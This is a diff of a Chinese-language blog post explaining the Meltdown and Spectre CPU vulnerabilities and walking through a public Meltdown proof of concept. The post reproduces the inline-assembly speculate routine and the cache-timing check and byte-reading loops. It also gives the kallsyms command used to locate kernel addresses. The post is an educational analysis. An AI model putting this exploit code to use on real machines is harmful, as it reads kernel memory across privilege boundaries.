@@ -17,7 +17,7 @@
 <meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/banner.png">
 <meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/gdb.png">
 <meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/result.png">
-<meta property="og:updated_time" content="2018-01-08T14:38:39.000Z">
+<meta property="og:updated_time" content="2018-01-08T15:27:47.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一步一步理解CPU芯片漏洞：Meltdown与Spectre">
 <meta name="twitter:description" content="作者：Diting0x 0X00 历史之日2018年1月3日，Google Project Zero（GPZ）团队安全研究员Jann Horn在其团队博客中爆出CPU芯片的两组漏洞，分别是Meltdown与Spectre。 Meltdown对应CVE-2017-5754（恶意数据缓存加载），Spectre对于CVE-2017-5753（边界检查绕过）与CVE-2017-5715（分支目标注入）。看">
@@ -97,32 +97,34 @@
 <p>基于缓存的侧信道攻击目前在学术界研究中非常流行，比如俄亥俄州立大学的<a href="http://web.cse.ohio-state.edu/~zhang.834/" target="_blank" rel="external">Yinqian Zhang教授</a>在此领域做了许多非常杰出的工作。缓存通过数据共享来加快数据访问，也就是说缓存命中与失效对应的响应时间是有差别的，攻击者正是利用这种时间的差异性来推测缓存中的信息，从而获得隐私数据。缓存侧信道攻击主要有<a href="https://dl.acm.org/citation.cfm?id=2725064" target="_blank" rel="external">Evict+Time</a>、<a href="http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf" target="_blank" rel="external">Prime+Probe</a>与<a href="https://www.usenix.org/node/184416" target="_blank" rel="external">Flush+Reload</a>等攻击方式，这里主要简单介绍一下Flush+Reload，也是下文exploit中利用的方法。假设攻击者和目标程序共享物理内存（也可以是云中不同虚拟机共享内存），攻击者可以反复利用处理器指令将监控的内存块（某些地址）从缓存中驱逐出去，然后在等待目标程序访问共享内存（Flush阶段）。然后攻击者重新加载监控的内存块并测量读取时间(Reload阶段)，如果该内存块被目标程序访问过，则访问时间将会较短，因为这时数据已经在缓存中。通过测量加载时间的长短，攻击者可以清楚地知道该内存块是否被目标程序读取过。</p>
 <p>Meltdown与Spectre利用这种侧信道可以进行越权内存访问，甚至读取整个内核的内存数据。</p>
 <p>以一个简化的Meltdown攻击指令序列为例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">; rcx = kernel address</div><div class="line">; rbx = target_array</div><div class="line">mov al, byte [rcx]</div><div class="line">shl rax, 0xc</div><div class="line">mov rbx, qword [rbx + rax]</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">; rcx = kernel address</div><div class="line">; rbx = probe_array</div><div class="line">mov al, byte [rcx]</div><div class="line">shl rax, 0xc</div><div class="line">mov rbx, qword [rbx + rax]</div></pre></td></tr></table></figure>
 <ol>
 <li><p>rcx寄存器存放用户空间程序不可访问的内核地址</p>
 </li>
-<li><p>rbx寄存器指向目标数组target_array</p>
+<li><p>rbx寄存器指向探测数组probe_array</p>
 </li>
 <li><p>一个具有用户级权限的攻击者在第三条指令中试图访问内核地址，处理器会对其作安全检查，检查该进程是否有权限访问该地址，于是这条指令会触发异常，该指令及之后的指令对寄存器的修改都会被丢弃，处理器重新回到能正常执行的指令中。但由于处理器采用乱序执行方式，在等待处理器完成该指令执行的同时（权限检查结束之前），后面两条指令已经被执行了（尽管最终会被丢弃）。</p>
 </li>
 <li><p>将指令3读取到的数据乘以4096（4KB），至于为什么是4096，会在下文具体exploit中介绍。</p>
 </li>
-<li><p>将指令4的结果作为索引对目标数组target_array(rbx[al*4096])进行访问。由于一个内存页的大小是4KB，不同的数据将会导致不同的内存页被访问并存放到CPU缓存中。</p>
+<li><p>将指令4的结果作为索引对探测数组probe_array(rbx[al*4096])进行访问并进行探测。由于一个内存页的大小是4KB，不同的数据将会导致不同的内存页被访问并存放到CPU缓存中。</p>
 </li>
 </ol>
 <p>此后，攻击者就可以通过缓存侧信道攻击，不断遍历加载rbx[al*4096]，由于该数据此时已经在缓存中，攻击者总会遍历出一个加载时间远小于其它的数据，推测哪个内存页被访问过了，从而推断出被访问的内核内存数据。</p>
+<p>强调一下，攻击者的目标是要不断探测probe_array来获取内核地址指向的数据。</p>
 <h2 id="0X02-Exploit-案例"><a href="#0X02-Exploit-案例" class="headerlink" title="0X02 Exploit 案例"></a>0X02 Exploit 案例</h2><p>来看在github上爆出的一个<a href="https://github.com/paboldin/meltdown-exploit/" target="_blank" rel="external">POC</a>，也是目前来看比较能让大家深入理解meltdown的一个exploit。该POC能利用应用程序读取内核中的linux_proc_banner变量，这个变量存储了Linux内核的版本信息，可以通过命令cat /proc/version获取。cat /proc/version触发了系统调用将linux_proc_banner变量的信息返回给应用程序。而利用meltdown漏洞可以直接从应用程序中访问linux_proc_banner变量，破坏了内存隔离。<br>该POC首先利用“sudo cat /proc/kallsyms | grep “linux_proc_banner””获取linux_proc_banner在内核中的地址，再读取该地址上的值。从该地址读取变量的值正是利用了meltdown漏洞。</p>
 <figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/banner.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/banner.png" width="550"></a><br>    <figcaption></figcaption><br></figure>
 
 
-<p>用gdb调试meltdown可执行程序</p>
+<p>总的来说，攻击者要窃取内核数据，包括三个过程：Flush阶段，Speculate过程以及Reload阶段。这三个过程我们会在下文一一提到。</p>
+<p>先用gdb调试meltdown可执行程序</p>
 <figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/gdb.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/gdb.png" width="550"></a><br>    <figcaption></figcaption><br></figure>
 
 
 <p>可以看到spcculate函数会触发段错误，而speculate函数也正是该POC最关键的代码，其由一段汇编代码组成：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  lea %[target], %%rbx\n\t&quot;</div><div class="line">&quot;1:\n\t&quot;</div><div class="line"></div><div class="line">&quot;.rept 300\n\t&quot;</div><div class="line">&quot;add $0x141, %%rax\n\t&quot;</div><div class="line">&quot;.endr\n\t&quot;</div><div class="line"></div><div class="line">&quot;movzx (%[addr]), %%eax\n\t&quot;</div><div class="line">&quot;shl $12, %%rax\n\t&quot;</div><div class="line">&quot;movzx (%%rbx, %%rax, 1), %%rbx\n&quot;</div><div class="line"></div><div class="line">&quot;stopspeculate: \n\t&quot;</div><div class="line">&quot;nop\n\t&quot;</div><div class="line">:</div><div class="line">: [target] &quot;m&quot; (target_array),</div><div class="line">[addr] &quot;r&quot; (addr)</div><div class="line">: &quot;rax&quot;, &quot;rbx&quot;</div></pre></td></tr></table></figure>
-<p>该函数的目的是欺骗CPU的乱序执行机制。此处是AT&amp;T 汇编语法，AT&amp;T格式的汇编指令是“源操作数在前，目的操作数在后”，而intel格式是反过来的，如下：</p>
-<p>lea %[target], %%rbx 把全局变量targetc_array的地址放到RBX寄存器中, target_array正好设置为256*4096字节大小，这个设置也是有讲究的，一个字节的取值范围正是0-255，共256个数。4096正好是x86架构中一个页面的大小。<br>如下：</p>
+<p>该函数的目的是欺骗CPU的乱序执行机制。此处是AT&amp;T 汇编语法，AT&amp;T格式的汇编指令是“源操作数在前，目的操作数在后”，而intel格式是反过来的。</p>
+<p>lea %[target], %%rbx 把全局变量target_array的地址放到RBX寄存器中，这里的target_ array正是上一章节中的探测数组probe_array， target_array正好设置为256*4096字节大小，这个设置也是有讲究的，一个字节的取值范围正是0-255，共256个数。4096正好是x86架构中一个页面的大小4KB。那target_array数组正好填充256个页面。<br>如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define TARGET_OFFSET	12</div><div class="line">#define TARGET_SIZE	(1 &lt;&lt; TARGET_OFFSET)</div><div class="line">#define BITS_READ	8</div><div class="line">#define VARIANTS_READ	(1 &lt;&lt; BITS_READ)</div><div class="line"></div><div class="line">static char target_array[VARIANTS_READ * TARGET_SIZE];</div></pre></td></tr></table></figure>
 <p>add $0x141, %%rax是一条加法指令，会重复300次，这条指令的作用只是测试处理器能乱序执行成功。</p>
 <p>movzx (%[addr]), %%eax 对应上一章节指令序列的第三条指令，将攻击者的目标内核地址所指向的数据放入eax寄存器中，该操作会触发处理器异常</p>
@@ -133,7 +135,12 @@
 <p>执行完movzx (%%rbx, %%rax, 1)指令之后，处理器开始处理异常，攻击者则注册一个信号处理器，直接修改程序指针寄存器，将执行位置跳转到stopspeculate指令继续执行即nop指令</p>
 <p>执行完speculate函数之后，开始执行check函数，代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">void check(void)</div><div class="line">&#123;</div><div class="line">	int i, time, mix_i;</div><div class="line">	volatile char *addr;</div><div class="line"></div><div class="line">	for (i = 0; i &lt; VARIANTS_READ; i++) &#123;</div><div class="line">		mix_i = ((i * 167) + 13) &amp; 255;</div><div class="line"></div><div class="line">		addr = &amp;target_array[mix_i * TARGET_SIZE];</div><div class="line">		time = get_access_time(addr);</div><div class="line"></div><div class="line">		if (time &lt;= cache_hit_threshold)</div><div class="line">			hist[mix_i]++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>check函数就是为了检测不同内存数据访问的时间差异来判断被缓存过的数据。<br>由于target_array的大小为256*4096，所以最多只要测试256次，就可以推测出内核地址指向的数据是否被访问过了。<br>至此，窃据数据过程完成。</p>
+<p>check函数就是为了检测不同内存数据访问的时间差异来判断被缓存过的数据。<br>由于target_array的大小为256*4096，所以最多只要测试256次，就可以推测出内核地址指向的数据中的一个字节是否被访问过了。注意，这里为什么是一个字节，前面说过一个字节正好最大可以表示255即256个数。所以要推测出内核地址指向的完整数据，需要不断循环这个过程，也就是下一段代码做的事情：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">for (score = 0, i = 0; i &lt; size; i++) &#123;</div><div class="line">		ret = readbyte(fd, addr);</div><div class="line">		if (ret == -1)</div><div class="line">			ret = 0xff;</div><div class="line">		printf(&quot;read %lx = %x %c (score=%d/%d)\n&quot;,</div><div class="line">		       addr, ret, isprint(ret) ? ret : &apos; &apos;,</div><div class="line">		       ret != 0xff ? hist[ret] : 0,</div><div class="line">		       CYCLES);</div><div class="line"></div><div class="line">		if (i &lt; sizeof(expected) &amp;&amp;</div><div class="line">		    ret == expected[i])</div><div class="line">			score++;</div><div class="line"></div><div class="line">		addr++;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>而readbyte函数会循环调用clflush_target(),speculate(addr),check()。如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">for (i = 0; i &lt; CYCLES; i++) &#123;</div><div class="line">		ret = pread(fd, buf, sizeof(buf), 0);</div><div class="line">		if (ret &lt; 0) &#123;</div><div class="line">			perror(&quot;pread&quot;);</div><div class="line">			break;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		clflush_target();</div><div class="line"></div><div class="line">		speculate(addr);</div><div class="line">		check();</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>这也正是前面讲到的Flush阶段（对应clflush_target()），Speculate过程（对应speculate函数）以及Reload阶段（对应check()）</p>
+<p>至此，攻击者窃据数据过程完成。</p>
 <p>下图为该POC的运行结果： </p>
 <figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/result.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/result.png" width="550"></a><br>    <figcaption></figcaption><br></figure>
 
